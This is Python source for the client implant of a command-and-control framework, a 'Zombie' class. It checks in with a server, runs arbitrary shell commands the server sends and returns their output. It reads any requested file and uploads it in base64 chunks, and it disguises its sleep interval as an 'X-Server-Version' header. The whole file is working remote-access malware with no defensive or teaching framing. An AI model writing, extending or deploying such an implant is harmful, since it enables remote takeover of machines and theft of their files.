import requests
import json
import secrets
import time
import base64
import subprocess
from os import path


class Zombie():
    id = ""
    token = ""
    host = "http://localhost:8080"
    sleep = ""
    #proxy = {"http":"http://localhost:8888/"}
    proxy = {}

    def __init__(self):
        self.id = self.gen_id()

    def set_sleep(self,time):
        self.sleep = time
        return
    
    def get_sleep(self):
        sleep = int(self.sleep)
        return sleep
    
    def get_host_info():
        return

    def gen_id(self):
        id = secrets.token_urlsafe(10)
        return id
    
    def checkin(self):
        data = '{"X-Client-ID":"'
        data += f"{self.id}"
        data += '"}'
        print(f"CHECKIN => payload to send: {data}")
        jData = json.loads(data)
        #req = requests.post("http://localhost:8080/checkin",headers={"Content-Type":"application/json"},data=jData)
        req = requests.post(f"{self.host}/checkin",json=jData,proxies=self.proxy,headers={'Content-Type':'application/json'},allow_redirects=False)
        #req = requests.post(f"{self.host}/checkin",json=jData,headers={'Content-Type':'application/json'},allow_redirects=False)

        return req

    def get_data(self):
        data = '{"X-Client-ID":"'
        data += f"{self.id}"
        data += '","Token":"'
        data += f"{self.get_token()}"
        data += '"}'
        print(f"GET_DATA => payload to send: {data}")
        jData = json.loads(data)
        resp = requests.get(f"{self.host}/recvFrom",json=jData,headers={'Content-Type':'application/json'},proxies=self.proxy)
        #resp = requests.get(f"{self.host}/recvFrom",json=jData,headers={'Content-Type':'application/json'})
        print(f"GET_DATA => Response Status Code: {resp.status_code}")
        print(f"GET_DATA => Response Content: {resp.content}")
        payload = resp.content.decode('utf-8')
        jPayload = json.loads(payload)
        data = jPayload['data']
        print(f"GET_DATA => Returning: {data}")
        return data

    def pagination(self,data:bytes,size:int) -> list:
        try:
            l = []
            print(f"PAGINATION => Recieved {len(data)}")
            while(len(data) > 0):
                l.append(data[:size])
                data = data[size:]
            return l
        except:
            print("PAGINATION => ERROR: Unable to break up string")
            return []
    
    """

    """
    def grab_chunks(self, file_object, chunk_size=50000):
        while True:
            data = file_object.read(chunk_size)
            if not data:
                break
            yield data

    def send_file_chunks(self,data:list):
        #print(f"SEND_FILE_CHUNKS => Found data: {data}")
        #print(f"SEND_FILE_CHUNKS => length to send:{(len(toSend)*5000)}")
        for x in range(0,len(data)):
            page = x+1
            if x == (len(data) - 1):
                page = "END"
            else:
                pass
            toSend = base64.b64encode(data[x])
            toSend = toSend.decode('utf-8')
            toSend = f"CHUNK:{toSend}"
            #print(f"SEND_FILE_CHUNKS => Chunk size: {len(data)}")
            #Add way to indicate pages
            payload = '{"X-Client-ID":"'
            payload += f"{self.id}"
            payload += '","data":"'
            payload += f"{toSend}"
            payload += '","page":"'
            payload += f"{page}"
            payload += '"}'
            #print(f"SEND_FILE => payload before json.loads:{payload}")
            jpayload = json.loads(payload)
            print(f"SEND_FILE_CHUNKS => jpayload:{jpayload}")
            try:
                #req = requests.post("http://localhost:8080/sendto", json=jpayload,headers={'Content-Type':'application/json'})
                req = requests.post("http://localhost:8080/sendto", json=jpayload,proxies=self.proxy,headers={'Content-Type':'application/json'})
            except requests.ConnectionError:
                print("SEND_FILE_CHUNKS => Couldn't Connect to server")
                self.sleep = 30
                req = None
                return req


    def prep_data(self,filename):
        # try:
        size = path.getsize(filename)
        print(f"PREP_DATA => filesize: {size}")
        if (size > 250000) and (size < 9223372036854775807):
            if (size > 1073741824):
                data_list = []
                with open(filename,'rb') as f:
                    for chunk in self.grab_chunks(f,chunk_size=500000):
                        data_list.append(chunk)
                    f.close()
                self.send_file_chunks(data_list)
                return "DONE"
            else:
                #logic to break up and send larger chunks of data
                data_list = []
                with open(filename,'rb') as f:
                    for chunk in self.grab_chunks(f):
                        data_list.append(chunk)
                    f.close()
                
                self.send_file_chunks(data_list)
                return "DONE"  
        else:
            #logic to send smaller files
            print("PREP_DATA => Found small file")
            with open(filename,'rb') as f:
                data = f.read()
                f.close()
            data = base64.b64encode(data)
        # except:
        #     print("PREP_DATA => Unable to open file for reading")
        #     data = "ERROR"
        return data

    def send_file(self,data:bytes):
        if data == "ERROR":
            #logic here to not send data 
            print("SEND_FILE => RECIEVED ERROR!")
            return
        elif data == "DONE":
            #prep_data has already finished sending to server, can return here
            return
        else:
            toSend = self.pagination(data,5000)
            #print(f"SEND_FILE => toSend chunks:{len(toSend)}")
            #print(f"SEND_FILE => toSend data:{toSend}")
            for x in range(0,len(toSend)):
                #print(f"[???] in FOR LOOP, LEN OF CHUNK: {len(toSend[x])}")
                page = x+1
                if x == (len(toSend) - 1):
                    page = "END"
                else:
                    pass
                #print(f"SEND_FILE => X is: {x}")
                data = toSend[x]
                data = "CHUNK:" + data.decode('utf-8')
                #Add way to indicate pages
                payload = '{"X-Client-ID":"'
                payload += f"{self.id}"
                payload += '","data":"'
                payload += f"{data}"
                payload += '","page":"'
                payload += f"{page}"
                payload += '"}'
                #print(f"SEND_FILE => payload before json.loads:{payload}")
                jpayload = json.loads(payload)
                #print(f"SEND_FILE => jpayload:{jpayload}")
                try:
                    #req = requests.post("http://localhost:8080/sendto", json=jpayload,headers={'Content-Type':'application/json'})
                    req = requests.post("http://localhost:8080/sendto", json=jpayload,proxies=self.proxy,headers={'Content-Type':'application/json'})
                except requests.ConnectionError:
                    print("SEND_FILE => Couldn't Connect to server")
                    self.sleep = 30
                    req = None
                    return req
            
    """

    """
    def read_in_chunks(file_object, chunk_size=5000):
        while True:
            data = file_object.read(chunk_size)
            if not data:
                break
            yield data


    # with open('really_big_file.dat') as f:
    #     for piece in read_in_chunks(f):
    #         process_data(piece)
            
    """
    - Take a byte string, format it in json payload and send to server
    """
    def send_data(self,data:bytes,):
        #Need to add support for larger command outputs (eg find /)
        if (len(data) > 5000):
            print(f"SEND_DATA => COMMAND OUTPUT IS OVER 5000, SENDING AS FILE")
            chunks = self.pagination(data,5000)
            self.send_file_chunks(chunks)
            return
        else:
            payload = '{"X-Client-ID":"'
            payload += f"{self.id}"
            payload += '","data":"'
            payload += f"{data.decode('utf-8')}"
            payload += '"}'
            jpayload = json.loads(payload)
            print(f"SEND_DATA => jpayload:{jpayload}")
            try:
                #req = requests.post("http://localhost:8080/sendto", json=jpayload,headers={'Content-Type':'application/json'})
                req = requests.post("http://localhost:8080/sendto", json=jpayload,proxies=self.proxy,headers={'Content-Type':'application/json'})
                return req
            except requests.ConnectionError:
                print("SEND_DATA => Couldn't Connect to server")
                self.sleep = 30
                req = None
                return req

    def set_token(self,token):
        self.token = token
        return
    
    def get_token(self):
        return self.token
    
"""
 - Parse the data and perform various actions based on whats recieved
"""
def process_data(data,zombie:Zombie):
    split = data.split(":")
    if split[0] == "CMD":
        #start another process and run the command
        cmd = split[1]
        res = subprocess.run(cmd, capture_output=True,shell=True)
        payload = b"CMD:"
        payload += split[1].encode('utf-8')
        payload += b":OUTPUT:"
        payload += res.stdout
        to_send = base64.b64encode(payload)
        #print(f"PROCESS_DATA => Payload to send to server: {to_send}")
        zombie.send_data(to_send)
        time.sleep(zombie.get_sleep())
    elif split[0] == "KILL":
        print("PROCESS_DATA => FOUND KILL, EXITING")
        exit()
    elif split[0] == "FILE":
        filename = split[1]
        print(f"PROCESS_DATA => Filename:{filename}")
        print("PROCESS_DATA => Recieved command to retrieve file.")
        # try:
        data = zombie.prep_data(filename)
        zombie.send_file(data)
        return
        # except:
        #     print("PROCESS_DATA => ERROR PROCESSING FILE TO SEND")
        #     return
    else:
        print(f"PROCESS_DATA => {split}")
    return

def main():
    zombie = Zombie()
    while(True):
        print("MAIN => Now checking in..")
        try:
            req = zombie.checkin()
        except requests.ConnectionError:
            print(f"MAIN => Couldn't contact main server...")
            print("Deep Sleep for 30!")
            time.sleep(30)
            continue
        print(f"MAIN => Response Content:{req.content}")
        print(f"MAIN => Response Status Code: {req.status_code}")
        if req.status_code == 200:
            content = req.content.decode("utf-8")
            print(f"MAIN => Content from server: {content}")
            jContent = json.loads(content)
            sleep = int(jContent['X-Server-Version'])
            zombie.set_sleep(sleep)
            print(f"MAIN => Time to sleep: {sleep}")
            print("")
            time.sleep(zombie.get_sleep())
        elif req.status_code == 302:
            print("MAIN => Command Found!")
            print(f"MAIN => Recieved from server: {req.content}")
            token = req.headers['Token']
            sleep = req.headers['X-Server-Version']
            print(f"MAIN => Setting token: {token}")
            zombie.set_token(token)
            print(f"MAIN => Setting sleep")
            zombie.set_sleep(sleep)
            b64data = zombie.get_data()
            #Do something with the data here
            print("MAIN => data found!")
            print(f"MAIN => b64data: {b64data}")
            data = base64.b64decode(b64data)
            data = data.decode('utf-8')
            process_data(data,zombie)
            #sleep
            time.sleep(zombie.get_sleep())

        else:
            print("MAIN => Didn't get correct status")
            time.sleep(zombie.get_sleep())

if __name__ == "__main__":
    main()